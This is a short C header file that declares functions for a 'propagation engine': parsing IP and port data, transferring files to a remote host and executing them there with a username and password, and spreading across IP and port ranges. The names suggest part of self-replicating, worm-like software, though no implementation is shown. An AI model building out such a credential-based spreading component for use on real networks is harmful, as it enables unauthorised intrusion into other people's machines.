#ifndef _PROPAGATIONENGINE_H
#define _PROPAGATIONENGINE_H

char* intTochar(int val, int base);
void parseIPPort(char buffer[], char paramPORT[]);
void fileTransfer(char *ip, char *username, char *pass);
void fileExecute(char *ip, char *username, char *pass, char range_ipSeq[], char range_portSeq[], int lenKey);
void propagation_engine(char* ip, char *username, char *pass, char range_ipSeq[], char range_portSeq[], int lenKey);

#endif
